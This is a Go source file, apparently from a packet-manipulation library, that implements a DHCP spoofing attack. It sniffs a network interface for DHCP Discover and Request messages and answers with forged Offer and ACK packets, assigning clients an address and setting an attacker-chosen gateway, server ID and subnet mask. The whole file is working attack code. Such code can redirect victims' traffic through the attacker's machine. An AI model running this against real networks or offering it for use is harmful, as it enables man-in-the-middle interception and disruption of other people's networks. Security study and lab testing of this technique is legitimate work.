package higherlevel

import (
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	"github.com/tiagomdiogo/ScaGo/sniffer"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"net"
)

func DHCPSpoofing(pool, mask, gateway, iface string) {

	availableIP, _ := utils.GeneratePool(pool, mask)
	newSniffer, _ := sniffer.NewSniffer(iface, "udp and (port 67 or 68)")
	serverIP := availableIP[len(availableIP)-1]

	defer newSniffer.Stop()
	go newSniffer.Start()
	fmt.Println("[*] Waiting for DHCP Discover")
	for {
		packets := newSniffer.GetPackets()
		if len(packets) == 0 {
			continue
		}
		for _, packetAux := range packets {
			dhcpLayer := packetAux.Layer(layers.LayerTypeDHCPv4)
			if dhcpLayer != nil {
				dhcp, _ := dhcpLayer.(*layers.DHCPv4)
				if dhcp.Operation == layers.DHCPOpRequest {
					messageType := layers.DHCPMsgTypeUnspecified
					for _, opt := range dhcp.Options {
						if opt.Type == layers.DHCPOptMessageType {
							messageType = layers.DHCPMsgType(opt.Data[0])
							break
						}
					}
					switch messageType {
					case layers.DHCPMsgTypeDiscover:
						DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "offer")
						fmt.Printf("[*] Got dhcp DISCOVER from: %s\n [*] Sending OFFER...\n [*] Sending DHCP Offer\n", dhcp.ClientHWAddr.String())
					case layers.DHCPMsgTypeRequest:
						DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "ack")
						fmt.Println("[*] Sending ACK")
					}
				}
			}
		}
	}
}

func DHCPOfferAck(dhcp *layers.DHCPv4, iface string, availableIP, sourceIp, gateway, mask net.IP, dhcptype string) {

	ethLayer := packet.EthernetLayer()
	ethLayer.SetSrcMAC(utils.MacByInt(iface))
	ethLayer.SetDstMAC(dhcp.ClientHWAddr.String())
	ethLayer.SetEthernetType(layers.EthernetTypeIPv4)

	ipLayer := packet.IPv4Layer()
	ipLayer.SetSrcIP(sourceIp.String())
	ipLayer.SetDstIP(availableIP.String())
	ipLayer.SetProtocol(layers.IPProtocolUDP)

	udpLayer := packet.UDPLayer()
	udpLayer.SetSrcPort("67")
	udpLayer.SetDstPort("68")
	udpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())

	dhcpLayer := packet.DHCPLayer()
	dhcpLayer.SetReply()
	dhcpLayer.SetDstMac(dhcp.ClientHWAddr.String())
	dhcpLayer.SetSrcIP(availableIP.String())
	dhcpLayer.SetXid(dhcp.Xid)
	dhcpLayer.SetMsgType(dhcptype)
	if dhcptype == "ack" {
		dhcpLayer.SetReply()
	}
	dhcpLayer.AddOption("server_id", sourceIp)
	dhcpLayer.AddOption("subnet_mask", mask)
	dhcpLayer.AddOption("router", gateway)
	dhcpLayer.AddOption("lease_time", 1728)
	dhcpLayer.AddOption("renewal_time", 864)
	dhcpLayer.AddOption("rebind_time", 13824)
	dhcpLayer.AddOption("end", 0)

	pkt, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), udpLayer.Layer(), dhcpLayer.Layer())
	communication.Send(pkt, iface)
}
